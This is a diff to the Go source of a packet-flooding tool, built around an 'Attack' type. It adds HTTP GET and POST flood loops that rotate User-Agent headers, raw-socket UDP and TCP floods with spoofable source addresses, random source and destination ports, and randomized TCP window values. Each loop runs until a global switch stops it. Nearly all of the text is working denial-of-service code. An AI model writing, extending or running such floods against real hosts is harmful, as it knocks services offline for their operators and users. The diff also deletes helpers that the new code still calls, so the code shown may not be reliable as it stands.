@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"strconv"
 	"syscall"
@@ -12,11 +13,12 @@ import (
 	"github.com/google/gopacket/layers"
 )
 
-var AttackSwitch bool
-
-func convInt(str string) int {
-	conv, _ := strconv.Atoi(fmt.Sprint(str))
-	return conv
+func sockBuffer(size string) []byte {
+	iSize := convInt(size)
+	if iSize < 10 || iSize > 1400 {
+		iSize = 100
+	}
+	return make([]byte, iSize)
 }
 
 func rawSocket(rawProtocol int) net.PacketConn {
@@ -62,9 +64,11 @@ func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
 func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
 	sBuffer, sOpt := setupOpt()
 	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
+	setWin, _ := strconv.ParseUint(genRange(65535, 25), 0, 16)
 	tcpLayers := &layers.TCP{
 		SrcPort: layers.TCPPort(tcpSrc.Port),
 		DstPort: layers.TCPPort(tcpDst.Port),
+		Window:  uint16(setWin),
 		SYN:     a.synFlag,
 		ACK:     a.ackFlag,
 		RST:     a.rstFlag,
@@ -77,17 +81,70 @@ func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
 	return sBuffer.Bytes()
 }
 
-func (a *Attack) udpPacket() {
-	dst := &net.UDPAddr{
-		IP:   net.ParseIP(a.dstAddr),
-		Port: convInt(a.dstPort),
+func (a *Attack) randDstPort() int {
+	if a.dstPort == "-r" {
+		return rand.Intn(65535)
 	}
+	return convInt(a.dstPort)
+}
+
+func (a *Attack) setupHTTP() (*http.Client, *http.Request) {
+	httpReq, _ := http.NewRequest(a.httpMethod, a.url+"/"+a.reqHeader, nil)
+	return &http.Client{}, httpReq
+}
+
+func (a *Attack) getRequest() {
+	get, usrAgent := a.setupHTTP()
+	for {
+		for agent := range httpAgent {
+			usrAgent.Header.Set("User-Agent", httpAgent[agent])
+			get.Do(usrAgent)
+			if AttackSwitch {
+				break
+			}
+		}
+		if AttackSwitch {
+			break
+		}
+	}
+}
+
+func (a *Attack) postRequest() {
+	post, postBody := a.setupHTTP()
+	for {
+		post.Do(postBody)
+		if AttackSwitch {
+			break
+		}
+	}
+}
+
+func (a *Attack) udpPacket() {
 	conn := rawSocket(syscall.IPPROTO_UDP)
 	for {
-		udp := a.setupUDP(&net.UDPAddr{
-			IP:   net.ParseIP(a.srcAddr),
-			Port: rand.Intn(65535)}, dst)
-		conn.WriteTo(udp, &net.IPAddr{IP: dst.IP})
+		/*
+			setup UDP dst.
+		*/
+		dst := &net.UDPAddr{
+			IP:   net.ParseIP(a.dstAddr),
+			Port: a.randDstPort(),
+		}
+		/*
+			setup UDP src.
+		*/
+		udp := a.setupUDP(
+			&net.UDPAddr{
+				IP:   net.ParseIP(a.srcAddr),
+				Port: rand.Intn(65535),
+			}, dst)
+		/*
+			send UDP packet.
+		*/
+		conn.WriteTo(udp,
+			&net.IPAddr{
+				IP: dst.IP,
+			},
+		)
 		if AttackSwitch {
 			break
 		}
@@ -95,16 +152,31 @@ func (a *Attack) udpPacket() {
 }
 
 func (a *Attack) tcpPacket() {
-	dst := &net.TCPAddr{
-		IP:   net.ParseIP(a.dstAddr),
-		Port: convInt(a.dstPort),
-	}
 	conn := rawSocket(syscall.IPPROTO_TCP)
 	for {
-		tcp := a.setupTCP(&net.TCPAddr{
-			IP:   net.ParseIP(a.srcAddr),
-			Port: rand.Intn(65535)}, dst)
-		conn.WriteTo(tcp, &net.IPAddr{IP: dst.IP})
+		/*
+			setup TCP dst.
+		*/
+		dst := &net.TCPAddr{
+			IP:   net.ParseIP(a.dstAddr),
+			Port: a.randDstPort(),
+		}
+		/*
+			setup TCP src.
+		*/
+		tcp := a.setupTCP(
+			&net.TCPAddr{
+				IP:   net.ParseIP(a.srcAddr),
+				Port: rand.Intn(65535),
+			}, dst)
+		/*
+			send TCP packet.
+		*/
+		conn.WriteTo(tcp,
+			&net.IPAddr{
+				IP: dst.IP,
+			},
+		)
 		if AttackSwitch {
 			break
 		}
